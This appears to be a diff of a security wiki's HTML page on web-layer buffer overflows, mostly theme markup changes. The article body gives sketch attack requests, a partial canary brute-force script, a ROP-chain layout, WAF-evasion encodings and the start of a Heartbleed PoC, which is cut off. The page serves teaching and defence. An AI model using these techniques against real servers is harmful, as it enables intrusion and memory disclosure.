@@ -1,37 +1,54 @@
 <!DOCTYPE html>
-<html lang="en" dir="ltr">
+<html lang="en" dir="ltr" data-theme="light">
 <head>
-  <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<meta name="description" content="Buffer Overflow (Web Server / App Layer) # A Buffer Overflow occurs when a program writes more data to a buffer (a fixed-size memory region) than it can hold, overwriting adjacent memory. At the web/application layer, these vulnerabilities exist in the underlying server software, native extensions, language runtimes, parsing libraries, and framework internals, not just in standalone binary exploitation. When exploited, they can corrupt control flow, leak memory, crash services, or hand an attacker arbitrary code execution on the server, all triggered by a crafted HTTP request.">
-<meta name="theme-color" content="#FFFFFF">
-<meta name="color-scheme" content="light dark"><meta property="og:title" content="Buffer Overflow" />
-<meta property="og:description" content="Buffer Overflow (Web Server / App Layer) # A Buffer Overflow occurs when a program writes more data to a buffer (a fixed-size memory region) than it can hold, overwriting adjacent memory. At the web/application layer, these vulnerabilities exist in the underlying server software, native extensions, language runtimes, parsing libraries, and framework internals, not just in standalone binary exploitation. When exploited, they can corrupt control flow, leak memory, crash services, or hand an attacker arbitrary code execution on the server, all triggered by a crafted HTTP request." />
-<meta property="og:type" content="article" />
-<meta property="og:url" content="https://cyber-security.wiki/docs/application-security/web/Buffer-Overflow/" /><meta property="article:section" content="docs" />
-
-<meta property="article:modified_time" content="2026-08-05T21:53:05+05:30" />
-<title>Buffer Overflow | Cyber Security Wiki</title>
-<link rel="manifest" href="/manifest.json">
-<link rel="icon" href="/favicon.png" type="image/x-icon">
-<link rel="stylesheet" href="/book.min.565a95e2043493949e3fa72db3ec317e1e40f462858e732a1b18d1354e9c030c.css" integrity="sha256-VlqV4gQ0k5SeP6cts&#43;wxfh5A9GKFjnMqGxjRNU6cAww=" crossorigin="anonymous">
-  <script defer src="/flexsearch.min.js"></script>
-  <script defer src="/en.search.min.78166b9d46e23e0ea915cb6887a30b633e7bc4fad10c8b6b9f6fa532271c19ba.js" integrity="sha256-eBZrnUbiPg6pFctoh6MLYz57xPrRDItrn2&#43;lMiccGbo=" crossorigin="anonymous"></script>
-
-  <script defer src="/sw.min.6f6f90fcb8eb1c49ec389838e6b801d0de19430b8e516902f8d75c3c8bd98739.js" integrity="sha256-b2&#43;Q/LjrHEnsOJg45rgB0N4ZQwuOUWkC&#43;NdcPIvZhzk=" crossorigin="anonymous"></script>
-<!--
+  <!--
 Made with Book Theme
 https://github.com/alex-shpak/hugo-book
 -->
+
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="Buffer Overflow (Web Server / App Layer)# A Buffer Overflow occurs when a program writes more data to a buffer (a fixed-size memory region) than it can hold, overwriting adjacent memory. At the web/application layer, these vulnerabilities exist in the underlying server software, native extensions, language runtimes, parsing libraries, and framework internals, not just in standalone binary exploitation. When exploited, they can corrupt control flow, leak memory, crash services, or hand an attacker arbitrary code execution on the server, all triggered by a crafted HTTP request.
+">
+<meta name="theme-color" media="(prefers-color-scheme: light)" content="#ffffff">
+<meta name="theme-color" media="(prefers-color-scheme: dark)" content="#2e3440">
+<meta name="color-scheme" content="light dark"><meta property="og:url" content="https://cyber-security.wiki/docs/application-security/web/Buffer-Overflow/">
+	<meta property="og:site_name" content="Cyber Security Wiki">
+	<meta property="og:title" content="Buffer Overflow">
+	<meta property="og:description" content="Buffer Overflow (Web Server / App Layer)# A Buffer Overflow occurs when a program writes more data to a buffer (a fixed-size memory region) than it can hold, overwriting adjacent memory. At the web/application layer, these vulnerabilities exist in the underlying server software, native extensions, language runtimes, parsing libraries, and framework internals, not just in standalone binary exploitation. When exploited, they can corrupt control flow, leak memory, crash services, or hand an attacker arbitrary code execution on the server, all triggered by a crafted HTTP request.">
+	<meta property="og:locale" content="en">
+	<meta property="og:type" content="article">
+		<meta property="article:section" content="docs">
+		<meta property="article:modified_time" content="2026-08-05T21:53:05+05:30">
+
+
+	<meta itemprop="name" content="Buffer Overflow">
+	<meta itemprop="description" content="Buffer Overflow (Web Server / App Layer)# A Buffer Overflow occurs when a program writes more data to a buffer (a fixed-size memory region) than it can hold, overwriting adjacent memory. At the web/application layer, these vulnerabilities exist in the underlying server software, native extensions, language runtimes, parsing libraries, and framework internals, not just in standalone binary exploitation. When exploited, they can corrupt control flow, leak memory, crash services, or hand an attacker arbitrary code execution on the server, all triggered by a crafted HTTP request.">
+	<meta itemprop="dateModified" content="2026-08-05T21:53:05+05:30">
+	<meta itemprop="wordCount" content="3129">
+
+<title>Buffer Overflow • Cyber Security Wiki</title>
+<link rel="icon" href="/favicon.png" >
+<link rel="manifest" href="/manifest.json">
+<link rel="canonical" href="https://cyber-security.wiki/docs/application-security/web/Buffer-Overflow/">
+<link rel="stylesheet" href="/book.min.4d77e98d764f495b145946ef9260681bab38aaf7bc01f96a6f61a3a0fea19dbf.css" integrity="sha256-TXfpjXZPSVsUWUbvkmBoG6s4qve8Aflqb2GjoP6hnb8=" crossorigin="anonymous">
+
+
+
+  <script defer type="module" src="/en.search.min.07d8a67671a2c683431c7034b07b0f4b6c6daae7a9c289fde2e3663a9ff4e6c5.js" integrity="sha256-B9imdnGixoNDHHA0sHsPS2xtquepwon94uNmOp/05sU=" crossorigin="anonymous"></script>
+
+  <script defer src="/sw.min.6f6f90fcb8eb1c49ec389838e6b801d0de19430b8e516902f8d75c3c8bd98739.js" integrity="sha256-b2&#43;Q/LjrHEnsOJg45rgB0N4ZQwuOUWkC&#43;NdcPIvZhzk=" crossorigin="anonymous"></script>
+
   
 </head>
-<body dir="ltr">
+<body dir="ltr" class="book-kind-page book-type-docs">
   <input type="checkbox" class="hidden toggle" id="menu-control" />
   <input type="checkbox" class="hidden toggle" id="toc-control" />
   <main class="container flex">
-    <aside class="book-menu">
-      <div class="book-menu-content">
-        
+    
+<aside class="book-menu">
+  <div class="book-menu-content">
+    
   <nav>
 <h2 class="book-brand">
   <a class="flex align-center" href="/"><img src="/logo.png" alt="Logo" /><span>Cyber Security Wiki</span>
@@ -39,11 +56,15 @@ https://github.com/alex-shpak/hugo-book
 </h2>
 
 
-<div class="book-search">
-  <input type="text" id="book-search-input" placeholder="Search" aria-label="Search" maxlength="64" data-hotkeys="s/" />
+<div class="book-search hidden">
+  <input id="book-search-input" type="text" 
+    placeholder="Search"
+    aria-label="Search"
+    maxlength="64" />
   <div class="book-search-spinner hidden"></div>
   <ul id="book-search-results"></ul>
 </div>
+<script>document.querySelector(".book-search").classList.remove("hidden")</script>
 
 
 
@@ -54,9 +75,6 @@ https://github.com/alex-shpak/hugo-book
 
 
 
-
-
-  
 
 
 
@@ -71,8 +89,8 @@ https://github.com/alex-shpak/hugo-book
 
   
     <br>
-    <input type="checkbox" id="section-3478c05c39c328756601a040a5f9b7dc" class="toggle" checked />
-    <label for="section-3478c05c39c328756601a040a5f9b7dc" class="flex justify-between" style="font-weight: bold;">
+    <input type="checkbox" id="section-1f4bf90b10ddb9d04537ec779b672afa" class="toggle" checked />
+    <label for="section-1f4bf90b10ddb9d04537ec779b672afa" class="flex justify-between" style="font-weight: bold;">
       <a role="button" class="">Application Security</a>
     </label>
   
@@ -88,8 +106,8 @@ https://github.com/alex-shpak/hugo-book
 
   
     <br>
-    <input type="checkbox" id="section-3d187f458be5e96a9f7134b06fcbe171" class="toggle"  />
-    <label for="section-3d187f458be5e96a9f7134b06fcbe171" class="flex justify-between" style="font-weight: bold;">
+    <input type="checkbox" id="section-97ce584ed7ffb43a07e43ad9f5889c71" class="toggle"  />
+    <label for="section-97ce584ed7ffb43a07e43ad9f5889c71" class="flex justify-between" style="font-weight: bold;">
       <a role="button" class="">Thick Client</a>
     </label>
   
@@ -175,8 +193,8 @@ https://github.com/alex-shpak/hugo-book
 
   
     <br>
-    <input type="checkbox" id="section-0a8389ed2dba897f3cc2a5f45ae28a35" class="toggle"  />
-    <label for="section-0a8389ed2dba897f3cc2a5f45ae28a35" class="flex justify-between" style="font-weight: bold;">
+    <input type="checkbox" id="section-26c356cfc062017e944cd67af2378245" class="toggle"  />
+    <label for="section-26c356cfc062017e944cd67af2378245" class="flex justify-between" style="font-weight: bold;">
       <a role="button" class="">Vulnerable Applications</a>
     </label>
   
@@ -223,8 +241,8 @@ https://github.com/alex-shpak/hugo-book
 
   
     <br>
-    <input type="checkbox" id="section-305f8624390448e7b7dfdcd57bcf3063" class="toggle" checked />
-    <label for="section-305f8624390448e7b7dfdcd57bcf3063" class="flex justify-between" style="font-weight: bold;">
+    <input type="checkbox" id="section-db0925704b156fffd3db5c66cb42d41d" class="toggle" checked />
+    <label for="section-db0925704b156fffd3db5c66cb42d41d" class="flex justify-between" style="font-weight: bold;">
       <a role="button" class="">Web</a>
     </label>
   
@@ -978,8 +996,8 @@ https://github.com/alex-shpak/hugo-book
 
   
     <br>
-    <input type="checkbox" id="section-eddb28de10b6358a7d90165be197c24d" class="toggle"  />
-    <label for="section-eddb28de10b6358a7d90165be197c24d" class="flex justify-between" style="font-weight: bold;">
+    <input type="checkbox" id="section-0d71dd2ccc73d3f39ad17c2db51c8573" class="toggle"  />
+    <label for="section-0d71dd2ccc73d3f39ad17c2db51c8573" class="flex justify-between" style="font-weight: bold;">
       <a role="button" class="">Cloud Security</a>
     </label>
   
@@ -1000,8 +1018,8 @@ https://github.com/alex-shpak/hugo-book
 
   
     <br>
-    <input type="checkbox" id="section-80f73357b2e3d82569ab2419d9c8fd53" class="toggle"  />
-    <label for="section-80f73357b2e3d82569ab2419d9c8fd53" class="flex justify-between" style="font-weight: bold;">
+    <input type="checkbox" id="section-5ef99b8721144773b97f7bfef900362b" class="toggle"  />
+    <label for="section-5ef99b8721144773b97f7bfef900362b" class="flex justify-between" style="font-weight: bold;">
       <a role="button" class="">DevSecOps</a>
     </label>
   
@@ -1022,8 +1040,8 @@ https://github.com/alex-shpak/hugo-book
 
   
     <br>
-    <input type="checkbox" id="section-f8c2cedc89ecea36eb3aab749e9d9325" class="toggle"  />
-    <label for="section-f8c2cedc89ecea36eb3aab749e9d9325" class="flex justify-between" style="font-weight: bold;">
+    <input type="checkbox" id="section-a54fb62d899fdd9f3e0ff5a546ca08ec" class="toggle"  />
+    <label for="section-a54fb62d899fdd9f3e0ff5a546ca08ec" class="flex justify-between" style="font-weight: bold;">
       <a role="button" class="">Exploit Development</a>
     </label>
   
@@ -1044,8 +1062,8 @@ https://github.com/alex-shpak/hugo-book
 
   
     <br>
-    <input type="checkbox" id="section-ac63c4b6399921ce8f97ed202a2ebcb8" class="toggle"  />
-    <label for="section-ac63c4b6399921ce8f97ed202a2ebcb8" class="flex justify-between" style="font-weight: bold;">
+    <input type="checkbox" id="section-2aeefa6ddff0a8e5db97003607c446af" class="toggle"  />
+    <label for="section-2aeefa6ddff0a8e5db97003607c446af" class="flex justify-between" style="font-weight: bold;">
       <a role="button" class="">IoT Security</a>
     </label>
   
@@ -1066,8 +1084,8 @@ https://github.com/alex-shpak/hugo-book
 
   
     <br>
-    <input type="checkbox" id="section-ff3f320cd65cf7b2cc2597d57706ff2e" class="toggle"  />
-    <label for="section-ff3f320cd65cf7b2cc2597d57706ff2e" class="flex justify-between" style="font-weight: bold;">
+    <input type="checkbox" id="section-150b068623f422b911e0c10751e41d4b" class="toggle"  />
+    <label for="section-150b068623f422b911e0c10751e41d4b" class="flex justify-between" style="font-weight: bold;">
       <a role="button" class="">Machine Learning</a>
     </label>
   
@@ -1101,8 +1119,8 @@ https://github.com/alex-shpak/hugo-book
 
   
     <br>
-    <input type="checkbox" id="section-3110560962cac834dcd3aead95e804a4" class="toggle"  />
-    <label for="section-3110560962cac834dcd3aead95e804a4" class="flex justify-between" style="font-weight: bold;">
+    <input type="checkbox" id="section-5d1d2284d8b625a6ff29beaf70c29606" class="toggle"  />
+    <label for="section-5d1d2284d8b625a6ff29beaf70c29606" class="flex justify-between" style="font-weight: bold;">
       <a role="button" class="">Network</a>
     </label>
   
@@ -1123,8 +1141,8 @@ https://github.com/alex-shpak/hugo-book
 
   
     <br>
-    <input type="checkbox" id="section-089d0b2a47920473e631158da2244e55" class="toggle"  />
-    <label for="section-089d0b2a47920473e631158da2244e55" class="flex justify-between" style="font-weight: bold;">
+    <input type="checkbox" id="section-5f3c3bc6686a139a7fd4ba11c67ca45b" class="toggle"  />
+    <label for="section-5f3c3bc6686a139a7fd4ba11c67ca45b" class="flex justify-between" style="font-weight: bold;">
       <a role="button" class="">Red Teaming</a>
     </label>
   
@@ -1145,8 +1163,8 @@ https://github.com/alex-shpak/hugo-book
 
   
     <br>
-    <input type="checkbox" id="section-b1f24361e619eb3af87e435a6f600cbe" class="toggle"  />
-    <label for="section-b1f24361e619eb3af87e435a6f600cbe" class="flex justify-between" style="font-weight: bold;">
+    <input type="checkbox" id="section-48d01542c459fd722a2e871cc9bbd985" class="toggle"  />
+    <label for="section-48d01542c459fd722a2e871cc9bbd985" class="flex justify-between" style="font-weight: bold;">
       <a role="button" class="">Threat Modelling</a>
     </label>
   
@@ -1167,35 +1185,13 @@ https://github.com/alex-shpak/hugo-book
 
 
 
-<hr>
-<b>
 
-
-  
-<ul>
-  
-  <li>
-    <a href="/contribute/" >
-        Contribute
-      </a>
-  </li>
-  
-  <li>
-    <a href="https://securecode.wiki" target="_blank" rel="noopener">
-        Secure Code Wiki by Payatu
-      </a>
-  </li>
-  
-</ul>
+<ul><li><a href="/contribute/" title="Contribute">contribute</a></li><li><a href="https://securecode.wiki" target="_blank" rel="noopener">Secure Code Wiki by Payatu</a></li></ul>
 
 
 
 
-
-
-</b>
 </nav>
-
 
 
 
@@ -1203,30 +1199,31 @@ https://github.com/alex-shpak/hugo-book
   <script>(function(){var e=document.querySelector("aside .book-menu-content");addEventListener("beforeunload",function(){localStorage.setItem("menu.scrollTop",e.scrollTop)}),e.scrollTop=localStorage.getItem("menu.scrollTop")})()</script>
 
 
+
+  </div>
+</aside>
  
-      </div>
-    </aside>
 
     <div class="book-page">
-      <header class="book-header">
+      <header class="book-header hidden">
         
   <div class="flex align-center justify-between">
   <label for="menu-control">
-    <img src="/svg/menu.svg" class="book-icon" alt="Menu" />
+    <img src="/icons/menu.svg" class="book-icon" alt="Menu" />
   </label>
 
-  <strong>Buffer Overflow</strong>
+  <h3>Buffer Overflow</h3>
 
   <label for="toc-control">
     
-    <img src="/svg/toc.svg" class="book-icon" alt="Table of Contents" />
+    <img src="/icons/toc.svg" class="book-icon" alt="Table of Contents" />
     
   </label>
 </div>
 
 
   
-  <aside class="hidden clearfix">
+  <aside class="hidden">
     
   
 <nav id="TableOfContents">
@@ -1300,20 +1297,11 @@ https://github.com/alex-shpak/hugo-book
 
       
       
-  <article class="markdown"><h1 id="buffer-overflow-web-server--app-layer">
-  Buffer Overflow (Web Server / App Layer)
-  <a class="anchor" href="#buffer-overflow-web-server--app-layer">#</a>
-</h1>
+  <article class="markdown book-article"><h1 id="buffer-overflow-web-server--app-layer">Buffer Overflow (Web Server / App Layer)<a class="anchor" href="#buffer-overflow-web-server--app-layer">#</a></h1>
 <p>A Buffer Overflow occurs when a program writes more data to a buffer (a fixed-size memory region) than it can hold, overwriting adjacent memory. At the web/application layer, these vulnerabilities exist in the <strong>underlying server software, native extensions, language runtimes, parsing libraries, and framework internals,</strong> not just in standalone binary exploitation. When exploited, they can corrupt control flow, leak memory, crash services, or hand an attacker arbitrary code execution on the server, all triggered by a crafted HTTP request.</p>
 <p>Unlike client-side or logic bugs, buffer overflows at this layer bypass the application entirely and attack the infrastructure it runs on.</p>
-<h2 id="types-of-buffer-overflow-attacks">
-  Types of Buffer Overflow Attacks
-  <a class="anchor" href="#types-of-buffer-overflow-attacks">#</a>
-</h2>
-<h3 id="1-stack-based-buffer-overflow">
-  1. Stack-Based Buffer Overflow
-  <a class="anchor" href="#1-stack-based-buffer-overflow">#</a>
-</h3>
+<h2 id="types-of-buffer-overflow-attacks">Types of Buffer Overflow Attacks<a class="anchor" href="#types-of-buffer-overflow-attacks">#</a></h2>
+<h3 id="1-stack-based-buffer-overflow">1. Stack-Based Buffer Overflow<a class="anchor" href="#1-stack-based-buffer-overflow">#</a></h3>
 <p>The most classical form. A function allocates a fixed-size buffer on the stack; excess input overwrites the saved return address, letting an attacker redirect execution.</p>
 <ul>
 <li>Input is written into a local stack variable without bounds checking.</li>
@@ -1324,11 +1312,7 @@ https://github.com/alex-shpak/hugo-book
 </ul>
 <pre tabindex="0"><code>GET /cgi-bin/search.cgi?query=AAAA...[4096 bytes]...AAAA HTTP/1.1
 Host: target.com
-# Overwrites return address on the stack inside the CGI binary
-</code></pre><h3 id="2-heap-based-buffer-overflow">
-  2. Heap-Based Buffer Overflow
-  <a class="anchor" href="#2-heap-based-buffer-overflow">#</a>
-</h3>
+# Overwrites return address on the stack inside the CGI binary</code></pre><h3 id="2-heap-based-buffer-overflow">2. Heap-Based Buffer Overflow<a class="anchor" href="#2-heap-based-buffer-overflow">#</a></h3>
 <p>Overflow occurs in heap-allocated memory. Instead of a return address, the attacker corrupts heap metadata, adjacent objects, or function pointers stored on the heap.</p>
 <ul>
 <li>Harder to exploit but equally dangerous; often leads to use-after-free or arbitrary write primitives.</li>
@@ -1341,11 +1325,7 @@ Content-Type: multipart/form-data; boundary=X
 
 --X
 Content-Disposition: form-data; name=&#34;file&#34;; filename=&#34;evil.png&#34;
-[Crafted PNG with oversized IHDR chunk → heap overflow in libpng parser]
-</code></pre><h3 id="3-integer-overflow--buffer-overflow">
-  3. Integer Overflow → Buffer Overflow
-  <a class="anchor" href="#3-integer-overflow--buffer-overflow">#</a>
-</h3>
+[Crafted PNG with oversized IHDR chunk → heap overflow in libpng parser]</code></pre><h3 id="3-integer-overflow--buffer-overflow">3. Integer Overflow → Buffer Overflow<a class="anchor" href="#3-integer-overflow--buffer-overflow">#</a></h3>
 <p>An arithmetic overflow in a size calculation produces a smaller-than-expected allocation, which is then filled with attacker data — causing an overflow of the undersized buffer.</p>
 <ul>
 <li>A <code>size_t</code> or <code>int</code> variable wraps around (e.g., <code>0xFFFFFFFF + 1 = 0</code>).</li>
@@ -1354,11 +1334,7 @@ Content-Disposition: form-data; name=&#34;file&#34;; filename=&#34;evil.png&#34;
 </ul>
 <pre tabindex="0"><code>POST /upload HTTP/1.1
 Content-Length: 4294967295   ← 0xFFFFFFFF
-[Server computes allocation as (length + 1) → wraps to 0 → tiny alloc → overflow]
-</code></pre><h3 id="4-off-by-one-overflow">
-  4. Off-by-One Overflow
-  <a class="anchor" href="#4-off-by-one-overflow">#</a>
-</h3>
+[Server computes allocation as (length + 1) → wraps to 0 → tiny alloc → overflow]</code></pre><h3 id="4-off-by-one-overflow">4. Off-by-One Overflow<a class="anchor" href="#4-off-by-one-overflow">#</a></h3>
 <p>A boundary condition error writes exactly one byte (or element) past the end of a buffer — often due to incorrect loop termination (<code>&lt;=</code> instead of <code>&lt;</code>) or null-terminator mishandling.</p>
 <ul>
 <li>Small in scope but can overwrite the least-significant byte of a saved frame pointer (<code>EBP</code>), enabling frame pointer overwrite attacks.</li>
@@ -1366,11 +1342,7 @@ Content-Length: 4294967295   ← 0xFFFFFFFF
 <li>Less likely to crash immediately, making them harder to detect via fuzzing alone.</li>
 </ul>
 <pre tabindex="0"><code>Cookie: session=[255 bytes of &#39;A&#39;] → overwrites 1 byte past buffer
-# Corrupts adjacent heap chunk header or LSB of saved EBP
-</code></pre><h3 id="5-format-string--memory-corruption">
-  5. Format String → Memory Corruption
-  <a class="anchor" href="#5-format-string--memory-corruption">#</a>
-</h3>
+# Corrupts adjacent heap chunk header or LSB of saved EBP</code></pre><h3 id="5-format-string--memory-corruption">5. Format String → Memory Corruption<a class="anchor" href="#5-format-string--memory-corruption">#</a></h3>
 <p>While technically distinct, format string vulnerabilities in web-facing C components (logging functions, error handlers) can produce arbitrary read/write primitives equivalent to buffer overflows.</p>
 <ul>
 <li>Input is passed directly to <code>printf</code>, <code>sprintf</code>, <code>syslog</code> without a format string.</li>
@@ -1378,11 +1350,7 @@ Content-Length: 4294967295   ← 0xFFFFFFFF
 <li><code>%x</code> / <code>%s</code> leak stack content, enabling memory layout disclosure for follow-on overflow exploitation.</li>
 </ul>
 <pre tabindex="0"><code>GET /page?msg=%x.%x.%x.%x.%n HTTP/1.1
-# Leaks stack values; %n writes to an attacker-controlled pointer
-</code></pre><h3 id="6-http-request-smuggling--buffer-confusion">
-  6. HTTP Request Smuggling → Buffer Confusion
-  <a class="anchor" href="#6-http-request-smuggling--buffer-confusion">#</a>
-</h3>
+# Leaks stack values; %n writes to an attacker-controlled pointer</code></pre><h3 id="6-http-request-smuggling--buffer-confusion">6. HTTP Request Smuggling → Buffer Confusion<a class="anchor" href="#6-http-request-smuggling--buffer-confusion">#</a></h3>
 <p>At the web layer, conflicting <code>Content-Length</code> and <code>Transfer-Encoding</code> headers between a front-end proxy and back-end server cause the backend to misparse request boundaries — effectively &ldquo;overflowing&rdquo; the logical request buffer of the backend parser.</p>
 <ul>
 <li>The front-end processes <code>Transfer-Encoding: chunked</code>; the back-end reads <code>Content-Length</code>.</li>
@@ -1396,11 +1364,7 @@ Transfer-Encoding: chunked
 
 0
 
-SMUGGLED-PREFIX
-</code></pre><h2 id="attack-surface">
-  Attack Surface
-  <a class="anchor" href="#attack-surface">#</a>
-</h2>
+SMUGGLED-PREFIX</code></pre><h2 id="attack-surface">Attack Surface<a class="anchor" href="#attack-surface">#</a></h2>
 <ul>
 <li><strong>Web Server Modules:</strong> Apache <code>mod_rewrite</code>, <code>mod_ssl</code>, <code>mod_auth</code> — C-based modules parsing user-controlled headers/URIs.</li>
 <li><strong>CGI / FastCGI Scripts:</strong> Native binaries invoked per-request, often written in C without modern protections.</li>
@@ -1413,15 +1377,9 @@ SMUGGLED-PREFIX
 <li><strong>WebSocket Frame Parsers:</strong> Custom or library-based binary frame parsers receiving attacker-controlled lengths.</li>
 <li><strong>Deserialization Endpoints:</strong> Native deserialization of binary formats (MessagePack, Protocol Buffers, BSON) in C extensions.</li>
 </ul>
-<h2 id="exploitation-and-bypassing-defenses">
-  Exploitation and Bypassing Defenses
-  <a class="anchor" href="#exploitation-and-bypassing-defenses">#</a>
-</h2>
+<h2 id="exploitation-and-bypassing-defenses">Exploitation and Bypassing Defenses<a class="anchor" href="#exploitation-and-bypassing-defenses">#</a></h2>
 <p>Modern systems deploy multiple mitigations. Real-world exploitation chains bypass them in sequence.</p>
-<h3 id="1-bypassing-stack-canaries">
-  1. Bypassing Stack Canaries
-  <a class="anchor" href="#1-bypassing-stack-canaries">#</a>
-</h3>
+<h3 id="1-bypassing-stack-canaries">1. Bypassing Stack Canaries<a class="anchor" href="#1-bypassing-stack-canaries">#</a></h3>
 <p>A random &ldquo;canary&rdquo; value is placed between the buffer and the return address; the function checks it before returning.</p>
 <p><strong>Bypass Techniques:</strong></p>
 <ul>
@@ -1429,7 +1387,7 @@ SMUGGLED-PREFIX
 <li><strong>Brute-force (fork-based servers):</strong> In <code>fork()</code>based servers, the child inherits the parent&rsquo;s canary. Leak it byte-by-byte across multiple requests without crashing the parent.</li>
 <li><strong>Overwrite a different target:</strong> Skip the return address; instead overwrite a function pointer or <code>__dtor_list</code> entry stored elsewhere on the stack or heap.</li>
 </ul>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e"># Brute-force canary byte-by-byte (fork server)</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e"># Brute-force canary byte-by-byte (fork server)</span>
 </span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> socket
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>canary <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span>  <span style="color:#75715e"># canaries always start with null byte</span>
@@ -1439,11 +1397,7 @@ SMUGGLED-PREFIX
 </span></span><span style="display:flex;"><span>        <span style="color:#75715e"># Send payload; if no crash, byte is correct</span>
 </span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> send_and_check(payload):
 </span></span><span style="display:flex;"><span>            canary <span style="color:#f92672">+=</span> bytes([guess])
-</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">break</span>
-</span></span></code></pre></div><h3 id="2-bypassing-aslr-address-space-layout-randomization">
-  2. Bypassing ASLR (Address Space Layout Randomization)
-  <a class="anchor" href="#2-bypassing-aslr-address-space-layout-randomization">#</a>
-</h3>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">break</span></span></span></code></pre></div><h3 id="2-bypassing-aslr-address-space-layout-randomization">2. Bypassing ASLR (Address Space Layout Randomization)<a class="anchor" href="#2-bypassing-aslr-address-space-layout-randomization">#</a></h3>
 <p>ASLR randomizes the base addresses of stack, heap, and libraries on each execution.</p>
 <p><strong>Bypass Techniques:</strong></p>
 <ul>
@@ -1452,10 +1406,7 @@ SMUGGLED-PREFIX
 <li><strong>Heap Spray (web context):</strong> Flood the heap with NOP sleds + shellcode via large number of requests; increases probability of hitting payload regardless of ASLR.</li>
 <li><strong>ret2plt / ret2libc:</strong> Jump to functions already mapped at known relative offsets (PLT entries are at fixed offsets from the binary base).</li>
 </ul>
-<h3 id="3-bypassing-nx--dep-non-executable-stackheap">
-  3. Bypassing NX / DEP (Non-Executable Stack/Heap)
-  <a class="anchor" href="#3-bypassing-nx--dep-non-executable-stackheap">#</a>
-</h3>
+<h3 id="3-bypassing-nx--dep-non-executable-stackheap">3. Bypassing NX / DEP (Non-Executable Stack/Heap)<a class="anchor" href="#3-bypassing-nx--dep-non-executable-stackheap">#</a></h3>
 <p>The OS marks stack and heap pages non-executable, so injected shellcode cannot run directly.</p>
 <p><strong>Bypass Techniques:</strong></p>
 <ul>
@@ -1465,11 +1416,7 @@ SMUGGLED-PREFIX
 </ul>
 <pre tabindex="0"><code># ROP Chain structure for ret2libc
 [PADDING][POP_RDI_GADGET][&#34;/bin/sh&#34; address][system() address]
-# Gadgets found using ROPgadget or ropper against the server binary
-</code></pre><h3 id="4-encoding--obfuscation-to-bypass-wafids">
-  4. Encoding &amp; Obfuscation to Bypass WAF/IDS
-  <a class="anchor" href="#4-encoding--obfuscation-to-bypass-wafids">#</a>
-</h3>
+# Gadgets found using ROPgadget or ropper against the server binary</code></pre><h3 id="4-encoding--obfuscation-to-bypass-wafids">4. Encoding &amp; Obfuscation to Bypass WAF/IDS<a class="anchor" href="#4-encoding--obfuscation-to-bypass-wafids">#</a></h3>
 <p>WAFs may detect known overflow patterns (long repetitive strings, shellcode bytes) via signature matching.</p>
 <ul>
 <li><strong>URL Encoding:</strong> <code>%41%41%41%41</code> instead of <code>AAAA</code> — WAF decodes after signature check.</li>
@@ -1483,17 +1430,10 @@ Transfer-Encoding: chunked
 
 5
 AAAA\x00           ← WAF sees 5-byte chunk, C parser stops at null
-[rest of payload in next chunk]
-</code></pre><h2 id="advanced-attack-scenarios">
-  Advanced Attack Scenarios
-  <a class="anchor" href="#advanced-attack-scenarios">#</a>
-</h2>
-<h3 id="1-heartbleed--heap-over-read-via-missing-bounds-check-cve-2014-0160">
-  1. Heartbleed — Heap Over-Read via Missing Bounds Check (CVE-2014-0160)
-  <a class="anchor" href="#1-heartbleed--heap-over-read-via-missing-bounds-check-cve-2014-0160">#</a>
-</h3>
+[rest of payload in next chunk]</code></pre><h2 id="advanced-attack-scenarios">Advanced Attack Scenarios<a class="anchor" href="#advanced-attack-scenarios">#</a></h2>
+<h3 id="1-heartbleed--heap-over-read-via-missing-bounds-check-cve-2014-0160">1. Heartbleed — Heap Over-Read via Missing Bounds Check (CVE-2014-0160)<a class="anchor" href="#1-heartbleed--heap-over-read-via-missing-bounds-check-cve-2014-0160">#</a></h3>
 <p>The OpenSSL TLS Heartbeat extension accepted a <code>payload_length</code> field from the client without verifying it matched the actual payload size. The server read <code>payload_length</code> bytes from heap memory and returned them — leaking private keys, session tokens, and user data.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e"># Simplified Heartbleed PoC structure</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e"># Simplified Heartbleed PoC structure</span>
 </span></span><span style="display:flex;"><span>heartbeat_request <span style="color:#f92672">=</span> (
 </span></span><span style="display:flex;"><span>    <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x18</span><span style="color:#e6db74">&#34;</span>           <span style="color:#75715e"># Content Type: Heartbeat</span>
 </span></span><span style="display:flex;"><span>    <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x03\x02</span><span style="color:#e6db74">&#34;</span>       <span style="color:#75715e"># TLS 1.1</span>
@@ -1501,69 +1441,43 @@ AAAA\x00           ← WAF sees 5-byte chunk, C parser stops at null
 </span></span><span style="display:flex;"><span>    <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x01</span><span style="color:#e6db74">&#34;</span>           <span style="color:#75715e"># Heartbeat Type: Request</span>
